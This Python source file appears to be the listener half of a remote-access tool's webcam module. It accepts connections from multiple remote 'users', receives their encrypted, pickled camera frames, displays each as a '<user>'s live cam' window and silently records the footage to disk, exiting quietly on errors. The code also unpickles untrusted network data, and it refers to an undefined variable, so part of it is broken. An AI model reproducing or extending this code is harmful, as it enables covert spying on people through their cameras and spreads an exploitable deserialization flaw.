import socket
import pickle
import zlib
import time
import random
import cv2
from sys import exit
from Specific.encrypt import Encryption
from Utilities.db_queries import get_module_data


try:
	# Address
	info = get_module_data()
	# Settings
	cam_settings = []
	# Socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((info[1], int(info[3].split(',')[1])))
	s.listen()
except:
	exit(0)


def cam_info():
	info = '\n'
	
	for index, setting in enumerate(cam_settings):
		info += f'    - {setting[0]}[{index}]'
		if len(cam_settings) > 1 and index + 1 != len(cam_settings):
			info += '\n'
	
	if len(cam_settings) == 0:
		info = 'False'
		
	return info


def set_cam_settings(index):
	global cam_settings

	try:
		if index == '*':
			for cam_setting in cam_settings:
				cam_setting[1].close()
			return 'Cams closed!'
		else:
			stream_settings[int(index)][1].close()
			return 'Cam closed!'
	except:
		return 'Cam failed to close.'



def Cam(encoding, path, user, quality):
	try:
		global cam_settings

		FRAMES = 5.0
		headersize = 10
		new_msg = True
		msg_len = 0
		full_msg = b''
		msg = b'next'

		r = random.randint(0, 1000000)
		e = Encryption()
		client, addr = s.accept()

		u = (user, client, addr)
		cam_settings.append(u)

		real_msg = pickle.dumps(msg)
		real_msg = zlib.compress(real_msg, 1)
		real_msg = e.do_encrypt(real_msg)
		final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
		client.send(final_msg)

		fourcc = cv2.VideoWriter_fourcc(*'XVID')
		out = cv2.VideoWriter(f'{path}/{time.strftime("%Y-%m-%d (%H-%M-%S")}.avi', fourcc, FRAMES, quality)

		while True:
			try:
				client_msg = client.recv(81920)

				if new_msg:
					msg_len = int(client_msg[:headersize])
					new_msg = False

				full_msg += client_msg

				if len(full_msg)-headersize == msg_len:
					frame = e.do_decrypt(full_msg[headersize:])
					frame = zlib.decompress(frame)
					frame = pickle.loads(frame)
					
					cv2.namedWindow(f'{user}\'s live cam. {r}', cv2.WINDOW_NORMAL)
					cv2.imshow(f'{user}\'s live cam. {r}', frame)
					out.write(frame)

					if cv2.waitKey(1) == 27:
						client.close()
						break
				
					real_msg = pickle.dumps(msg)
					real_msg = zlib.compress(real_msg, 1)
					real_msg = e.do_encrypt(real_msg)
					final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
					client.send(final_msg)
					
					new_msg = True
					msg_len = 0
					full_msg = b''
			except:
				cam_settings.remove(u)
				out.release()
				exit(0)

		cam_settings.remove(u)
		out.release()
	except:
		exit(0)